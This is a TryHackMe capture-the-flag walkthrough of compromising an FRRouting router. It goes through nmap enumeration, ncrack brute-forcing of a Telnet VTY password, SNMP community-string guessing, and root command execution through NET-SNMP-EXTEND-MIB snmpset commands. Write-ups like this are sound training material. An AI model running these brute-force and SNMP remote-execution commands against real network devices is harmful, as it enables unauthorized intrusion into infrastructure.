Operation Takeover

TryHackMe CTF. Take control of the network one router at a time.

We've gained access to the network devices VLAN. Time to hack into a router. One objective: find the flag in /root/.

Enumeration

Let's get physical.

nmap -sC -sV -Pn -p- -T4 10.144.132.135

I spy messages in that lengthy output discourse. We'll decipher momentarily.

nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.144.132.135 -oN Operation_Takeover_nmap_result.txt

This immediately stood out:

DNSVersionBindReqTCP returned “Hello, this is FRRouting (version 10.0)” and a User Access Verification prompt.

A quick exploit search of FRRouting and version 10.0 pulled up two or three CVEs of interest. I’ll leave the tabs open.

Open Port 2623 is calling me. Visited http://TARGETIP:2623:

What someone could immediately assume to be garbage output is actually open negotiation Telnet-esque bytes. ÿ equates to 0xFF, the Telnet IAC marker. Now I’m starting to really enjoy this.

Telnet Enumeration

The system is already showing signs of a failure threshold limit, so we must perform Telnet discovery with care and precision. I’m going to set up Ncat with Telnet handling:

ncat --telnet 10.144.132.135 2623

To be fair, this is what I expected.

I want to carefully craft an Ncrack command that won’t trip an already on alert system. Ncrack handles Telnet better than Nmap, hence why it’s my first choice. I also feel like I need to think outside the box with my wordlist choice. I’ll go for fasttrack.txt.

A quick check of FRRouting’s Telnet documentation indicates this is password-only VTY authentication, with no username needed. I’ll keep that in mind while crafting the Ncrack command.

A few sanity checks on the wordlist first:

My first Ncrack attempt had a syntax error. It wants the service name attached to the port. My bad. Let’s go again:

ncrack -p telnet:2623 --user test -P fasttrack.txt 10.144.132.135

Feels a bit hostile, am I right? Chill, my dude. I'm getting in there with or without you.

While waiting for Ncrack, I read more of the FRRouting documentation.

Ncrack was taking longer than I was comfortable with. Before trying a simpler approach than brute force, I searched for common passwords to FRRouting Telnet VTY services and tried a few manual candidates:

Well, so far we know what is not the password. I can’t brute force this one password at a time for very long. Let’s probe SNMP port 161 with a UDP scan.

SNMP

nmap -sU -p 161 --script snmp-brute 10.144.132.135

Excellent. Port 161 is open, and we might be able to take a peek at the config, or at least find some useful strings. I press a little further with onesixtyone:

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.144.132.135

Bam. We have a hit. The community string is pr1v4t3. SNMP is our hook. Woo!

SNMP Write Access and RCE

Let’s try snmpwalk, then test write access by renaming the host:

snmpwalk -v2c -c pr1v4t3 10.146.187.52 1.3.6.1.2.1.1.1.0
snmpset -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.2.1.1.5.0 s "Pwned"

Write access confirmed? More like right access confirmed in my hands. Muahahaha. Just kidding. Onwards.

Let’s see if we can extend this into RCE with NET-SNMP-EXTEND-MIB:

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
  'nsExtendStatus."command"' = createAndGo \
  'nsExtendCommand."command"' = /bin/bash \
  'nsExtendArgs."command"' = '-c "ls /root"'
snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2

Pwned, indeed. Inching closer:

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 10.146.187.52 \
  'nsExtendStatus."command"' = createAndGo \
  'nsExtendCommand."command"' = /bin/bash \
  'nsExtendArgs."command"' = '-c "cat /root/flag.txt"'

Click, click, boom:

snmpwalk -v2c -c pr1v4t3 10.146.187.52 .1.3.6.1.4.1.8072.1.3.2

Definitely my solution, not my problem.

*mic drop*

Full Attack Chain

nmap > FRRouting v10.0 on port 2623, SNMP port 161
> Telnet IAC bytes recognized on port 2623 > VTY password prompt
> Brute force taking too long > pivot to SNMP
> onesixtyone > community string: pr1v4t3
> snmpwalk confirms read access > snmpset confirms write access
> NET-SNMP-EXTEND-MIB > RCE > cat /root/flag.txt > flag
